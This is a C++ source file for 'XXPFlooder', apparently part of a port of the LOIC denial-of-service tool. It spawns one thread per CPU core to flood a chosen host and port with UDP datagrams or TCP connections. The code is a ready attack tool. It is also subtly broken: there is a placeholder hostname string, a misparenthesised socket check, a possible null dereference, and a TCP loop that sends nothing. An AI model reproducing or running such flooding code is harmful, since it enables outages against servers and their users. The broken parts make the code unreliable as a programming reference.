/*
 * XXPFlooder.cpp
 *
 *  Created on: Dec 4, 2012
 *      Author: ivan
 */

#include "XXPFlooder.h"

namespace loic {


	void XXPFlooder::Start()
	{
		this->flooding = true;

		for(unsigned int i = 0;i<boost::thread::hardware_concurrency();i++)
		{
			boost::thread t(&loic::XXPFlooder::work,this);
		}
	}

	void XXPFlooder::Stop()
	{
		this->flooding = false;
	}

	void XXPFlooder::work()
	{
		try
		{
			//set up the target host


			int sock;
			struct sockaddr_in server_addr;
			struct hostent *host;

			std::string remoteHost = "from the ip address";
			struct sockaddr_in remoteSocketInfo;

			//using hostname
			if(hostname)
			{
				if((host = gethostbyname(remoteHost.c_str())) == NULL)
				{
					std::cerr<<"System DNS name resolution not configured properly."<<std::endl;
					std::cerr<<"Error number: "<< ECONNREFUSED<<std::endl;
				}

				//Load system information for remote socket server into socket data structure
				memcpy((char*) & remoteSocketInfo.sin_addr, host->h_addr,host->h_length);
			}
			else
			{
				//using ip address
				remoteSocketInfo.sin_addr.s_addr = inet_addr(ip.c_str());
			}


			server_addr.sin_family = AF_INET;
			server_addr.sin_port = htons(port);
			server_addr.sin_addr = *((struct in_addr *)host->h_addr);
			bzero(&(server_addr.sin_zero),8);

			while(this->flooding)
			{
				if(this->protocol == 1)
				{
					if((sock = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)<0)){

						close(sock);
						std::cerr<<"ERROR"<<std::endl;
					}

					if((connect(sock, (struct sockaddr *)&remoteSocketInfo, sizeof(sockaddr_in)))<0)
					{
						close(sock);
						std::cerr<<"could not connect socket\n";
					}

					try
					{
						while(this->flooding)
						{
							this->floodcount++;

							if(delay>0)
							{
								//sleep for the delay
								boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
							}
						}
					}
					catch(std::exception & exe)
					{

					}

				}
				if(protocol == 2)
				{

					if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
					{
						std::cerr<<"ERROR! Socket error"<<std::endl;
						close(sock);
					}


					try
					{
						while(this->flooding)
						{
							floodcount++;
							sendto(sock,data.c_str(),data.length(),0, (struct sockaddr *)&server_addr, sizeof(struct sockaddr));
							if(delay>0)
							{
								boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
							}
						}
					}
					catch(std::exception & exc)
					{

					}
				}
			}
		}
		catch(std::exception &exe)
		{

		}
	}

	/* namespace loic */
}
